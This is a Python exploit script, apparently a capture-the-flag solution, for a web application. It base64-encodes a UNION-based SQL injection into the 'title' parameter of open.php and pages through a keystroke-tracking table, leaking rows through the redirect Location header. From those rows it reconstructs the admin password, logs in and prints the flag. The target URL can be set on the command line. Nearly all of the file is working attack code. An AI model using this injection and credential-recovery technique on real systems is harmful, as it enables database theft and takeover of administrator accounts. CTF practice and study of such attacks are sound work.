#!/usr/bin/env python

import sys
import requests
from urllib.parse import quote
from base64 import urlsafe_b64encode

from analyze import reconstruct_password

BASE_URL = 'http://localhost:8000'
ITEMS_PER_REQUEST = 50

def exploit():
    annotated = []

    print('[+] Downloading DB content', end='', flush=True)
    offset = 0
    while True:
        print('.', end='', flush=True)
        sqli = 'nope") UNION SELECT 420, "lel", CONCAT("FLUX", (SELECT group_concat(col SEPARATOR ";") FROM (SELECT CONCAT(`key`, ",", `timestamp`) COLLATE utf8mb4_unicode_ci as col FROM tracking WHERE `key` NOT IN (",", ";", 0x0a) LIMIT {} OFFSET {}) as tmp), "FLUX"), 1337;-- -'.format(ITEMS_PER_REQUEST, offset)
        sqli_b64 = urlsafe_b64encode(bytes(sqli, 'utf-8')).decode('utf-8')

        r = requests.get(BASE_URL + '/open.php?title={}'.format(sqli_b64), allow_redirects=False)
        if r.status_code != 302:
            print(r.status_code)
            print(r.text)
            return

        leak = r.headers['location']
        if len(leak) == 0:
            break

        leak = leak.split("FLUX")[1]
        for item in leak.split(';'):
            last_comma = item.rfind(',')
            key, timestamp = item[:last_comma], item[last_comma+1:]

            # normalize
            if len(key) > 1:
                key = '_'

            annotated.append((key, int(timestamp)))

        offset += ITEMS_PER_REQUEST

    print()
    print('[+] Reconstructing password...')
    password = reconstruct_password(annotated)
    print('[+] Password: {}'.format(password))

    data = {
        'user': 'admin',
        'pass': password,
    }
    r = requests.post(BASE_URL + '/login.php', data=data, allow_redirects=True)
    flag = r.text
    print('[+] Flag: {}'.format(flag))


if __name__ == "__main__":
    if len(sys.argv) == 2:
        BASE_URL = sys.argv[1]
    exploit()
